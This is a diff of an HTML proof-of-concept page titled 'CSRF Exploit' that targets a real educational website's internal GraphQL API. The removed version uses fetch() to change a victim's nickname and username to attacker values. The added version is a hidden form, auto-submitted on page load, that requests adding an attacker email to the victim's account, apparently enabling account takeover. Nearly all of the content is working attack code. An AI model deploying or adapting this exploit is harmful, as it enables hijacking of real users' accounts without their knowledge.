@@ -1,63 +1,20 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
 <body>
-    <h1>Click the button to perform a CSRF attack!</h1>
+    <h1>Click the button to trigger the CSRF attack!</h1>
 
-    <button id="csrfButton">Click to Update Profile</button>
+    <form id="csrfForm" action="https://www.khanacademy.org/api/internal/graphql/requestAuthEmail?lang=en&_=240807-1626-6591bfdb76a6_1723110650372" method="POST">
+        <input type="hidden" name="operationName" value="requestAuthEmail">
+        <input type="hidden" name="variables" value='{"authEmail":"hackeremail123.com"}'>
+        <input type="hidden" name="query" value='mutation requestAuthEmail($authEmail: String!) { requestAuthEmail(authEmail: $authEmail) { user { id pendingEmails __typename } error { code __typename } __typename } }'>
+        <input type="submit" value="Trigger CSRF Attack">
+    </form>
 
     <script>
-        document.getElementById('csrfButton').addEventListener('click', function() {
-            const data = {
-                operationName: "updateProfile",
-                variables: {
-                    bio: "",
-                    nickname: "AttackerNickname",
-                    username: "AttackerUsername"
-                },
-                query: `mutation updateProfile($avatarName: String, $bio: String, $profileAccessLevel: ProfileAccessLevel, $nickname: String, $username: String) {
-                  setSettings(
-                    avatarName: $avatarName
-                    bio: $bio
-                    nickname: $nickname
-                    username: $username
-                    profileAccessLevel: $profileAccessLevel
-                  ) {
-                    user {
-                      id
-                      avatar {
-                        name
-                        imageSrc
-                        __typename
-                      }
-                      bio
-                      profile {
-                        accessLevel
-                        __typename
-                      }
-                      nickname
-                      username
-                      __typename
-                    }
-                    errors {
-                      code
-                      __typename
-                    }
-                    __typename
-                  }
-                }`
-            };
-
-            fetch('https://www.khanacademy.org/api/internal/graphql/updateProfile?lang=en&_=240807-1626-6591bfdb76a6_1723107484284', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(result => console.log('Success:', result))
-            .catch(error => console.error('Error:', error));
-        });
+        document.getElementById('csrfForm').submit(); // Automatically submit the form
     </script>
 </body>
 </html>
